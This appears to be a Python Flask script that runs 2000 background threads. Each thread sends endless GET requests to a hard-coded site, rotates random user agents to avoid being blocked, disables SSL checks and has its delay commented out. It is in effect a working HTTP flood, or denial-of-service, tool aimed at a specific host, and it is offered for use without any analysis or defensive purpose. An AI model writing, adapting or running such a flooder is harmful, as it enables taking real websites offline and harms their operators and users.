from flask import Flask
import requests
import threading
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import urllib3
import time

app = Flask(__name__)

# تعطيل تحذيرات SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# تهيئة مولد وكيل المستخدم
ua = UserAgent()

def chek(url):
    while True:
        try:
            # توليد وكيل مستخدم عشوائي لكل طلب
            headers = {
                "User-Agent": ua.random,
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
            }
            response = requests.get(url, headers=headers, verify=False)
            status_code = response.status_code
            soup = BeautifulSoup(response.text, "html.parser")
            title = soup.title.string if soup.title else "No Title"
            print(f"[{status_code}] {title} - {url}")
        except requests.exceptions.RequestException as e:
            error_message = str(e)
            if hasattr(e, 'response') and e.response is not None:
                error_message = f"{e.response.status_code} - {e.response.reason}"
            print(f"Request failed: {error_message}")
        # تأخير بين الطلبات لتجنب الحظر
       # time.sleep(5)

def start_threads():
    target_url = "http://MO1.x10.mx/public"  # ضع الرابط هنا
    for _ in range(2000):
        thread = threading.Thread(target=chek, args=(target_url,))
        thread.daemon = True
        thread.start()

@app.route('/')
def home():
    return "Server is running with background threads!"

if __name__ == '__main__':
    threading.Thread(target=start_threads, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
